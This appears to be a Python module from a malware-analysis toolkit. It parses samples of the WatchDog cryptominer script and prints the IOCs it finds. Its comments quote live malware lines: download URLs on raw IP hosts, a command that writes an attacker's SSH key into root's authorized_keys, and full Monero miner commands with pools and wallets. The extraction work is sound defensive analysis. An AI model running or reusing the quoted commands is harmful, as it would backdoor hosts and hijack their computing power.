import os
import inspect
from optparse import OptionParser

from mishell.shell_family import Alpha


class watchdogminer(Alpha):
    NAME = "watchdogminer"

    def __init__(self):
        super(watchdogminer, self).__init__()
        self.anchor_processor = {}
        self.file_abs_path = None
        self.lines = None
        self._inspect_anchor_processor()

    def do(self, data, *args, **kwargs):
        for file_abs_path, anchor_lst in data.items():
            md5 = os.path.basename(file_abs_path)
            self._read_file(file_abs_path)
            self._find_anchor_processor(anchor_lst, md5)

    def get_process_result(self):
        pass

    def _read_file(self, file_abs_path):
        self.file_abs_path = file_abs_path
        with open(file_abs_path, "r") as f:
            self.lines = f.readlines()

    def _find_anchor_processor(self, anchor_dct, md5):
        print("Processing md5 {}".format(md5))
        for anchor, value in anchor_dct.items():
            func = self.anchor_processor.get(anchor, None)
            if func is not None:
                func(anchor, value)

    def _inspect_anchor_processor(self):
        for name, processor in inspect.getmembers(self):
            if not (name.startswith("anchor") and inspect.ismethod(processor)):
                continue
            self.anchor_processor[name] = processor
        return None

    # $anchor_zzh_dl
    # miner_url="http://199.19.226.117/b2f628/zzh"
    # miner_url_backup="http://106.15.74.113/b2f628/zzh"
    def anchor_watchdogminer_dl(self, anchor, value):
        for line in self.lines:
            line = line.strip()
            if line.startswith(value):
                try:
                    url = line.split("=")[1].strip("\"")
                    print(f"anchor_watchdogminer_dl: {url}")
                except Exception as e:
                    return

    # $anchor_config
    # config_url="http://199.19.226.117/b2f628/config.json"
    # config_url_backup="http://106.15.74.113/b2f628/config.json"
    def anchor_config(self, anchor, value):
        for line in self.lines:
            line = line.strip()
            if line.startswith(value):
                try:
                    url = line.split("=")[1].strip("\"")
                    print(f"anchor_config: {url}")
                except Exception as e:
                    return

    # $anchor_rsa
    # echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCmEFN80ELqVV9enSOn+05vOhtmmtuEoPFhompw+bTIaCDsU5Yn2yD77Yifc/yXh3O9mg76THr7vxomguO040VwQYf9+vtJ6CGtl7NamxT8LYFBgsgtJ9H48R9k6H0rqK5Srdb44PGtptZR7USzjb02EUq/15cZtfWnjP9pKTgscOvU6o1Jpos6kdlbwzNggdNrHxKqps0so3GC7tXv/GFlLVWEqJRqAVDOxK4Gl2iozqxJMO2d7TCNg7d3Rr3w4xIMNZm49DPzTWQcze5XciQyNoNvaopvp+UlceetnWxI1Kdswi0VNMZZOmhmsMAtirB3yR10DwH3NbEKy+ohYqBL root@puppetserver" > /root/.ssh/authorized_keys
    def anchor_rsa(self, anchor, value):
        for line in self.lines:
            line = line.strip()
            if line.startswith(value):
                try:
                    key = line.split(" ")[2]
                    # 0b41606cbc7424218154f3e6f690da9d
                    if len(key) < 10:
                        key = line.split(" ")[3]
                except Exception as e:
                    return
                print(f"anchor_rsa: {key}")

    # $anchor_zzh_sh
    # sh_url="http://199.19.226.117/b2f628/newinit.sh"
    # sh_url_backup="http://106.15.74.113/b2f628/newinit.sh"
    def anchor_watchdogminer_sh(self, anchor, value):
        for line in self.lines:
            line = line.strip()
            if line.startswith(value):
                try:
                    url = line.split("=")[1].strip("\"")
                    print(f"anchor_watchdogminer_sh: {url}")
                except Exception as e:
                    return

    # $anchor_wallet
    # ./zzh -B --log-file=/etc/etc --coin=monero -o stratum+tcp://xmr-asia1.nanopool.org:14444 --threads=$cpunum -u 43Xbgtym2GZWBk87XiYbCpTKGPBTxYZZWi44SWrkqqvzPZV6Pfmjv3UHR6FDwvPgePJyv9N5PepeajfmKp1X71EW7jx4Tpz -p x &
    # ./zzh --log-file=/etc/etc --donate-level 1 --keepalive --no-color --cpu-priority 5 -o xmr.f2pool.com:13531 -u 82etS8QzVhqdiL6LMbb85BdEC3KgJeRGT3X1F3DQBnJa2tzgBJ54bn4aNDjuWDtpygBsRqcfGRK4gbbw3xUy3oJv7TwpUG4.clean -k --coin monero -o xmr.pool.gntl.co.uk:10009 -u 87q6aU1M9xmQ5p3wh8Jzst5mcFfDzKEuuDjV6u7Q7UDnAXJR7FLeQH2UYFzhQatde2WHuZ9LbxRsf3PGA8gpnGXL3G7iWMv.clean --tls -k --coin monero -o 139.99.102.72:14433 -u 82etS8QzVhqdiL6LMbb85BdEC3KgJeRGT3X1F3DQBnJa2tzgBJ54bn4aNDjuWDtpygBsRqcfGRK4gbbw3xUy3oJv7TwpUG4.clean --tls -k --coin monero -o 80.211.206.105:9000 -u 82etS8QzVhqdiL6LMbb85BdEC3KgJeRGT3X1F3DQBnJa2tzgBJ54bn4aNDjuWDtpygBsRqcfGRK4gbbw3xUy3oJv7TwpUG4.clean --tls -k --coin monero --background
    def anchor_wallet(self, anchor, value):
        for line in self.lines:
            line = line.strip()
            if line.startswith(value):
                try:
                    parser = OptionParser()
                    parser.add_option("--log-file", action="append", type="string", nargs=1)
                    parser.add_option("--donate-level", action="append", type="string", nargs=1)
                    parser.add_option("--keepalive", action="append", type="string", nargs=1)
                    parser.add_option("--cpu-priority", action="append", type="string", nargs=1)
                    parser.add_option("--coin", action="append", type="string", nargs=1)
                    parser.add_option("--background", action="append", type="string", nargs=1)
                    parser.add_option("--threads", action="append", type="string", nargs=1)
                    parser.add_option("--tls", action="append", type="string", nargs=1)
                    parser.add_option("-o", action="append", type="string", nargs=1)
                    parser.add_option("-u", action="append", type="string", nargs=1)
                    parser.add_option("-k", action="append", type="string", nargs=1)
                    parser.add_option("-B", action="append", type="string", nargs=1)
                    parser.add_option("-p", action="append", type="string", nargs=1)
                    parse_result = parser.parse_args(line.split(" "))

                    minerpool = parse_result[0].o
                    print(f"anchor_wallet pool:{minerpool}")
                    wallet = parse_result[0].u
                    print(f"anchor_wallet: {wallet}")
                except Exception as e:
                    return
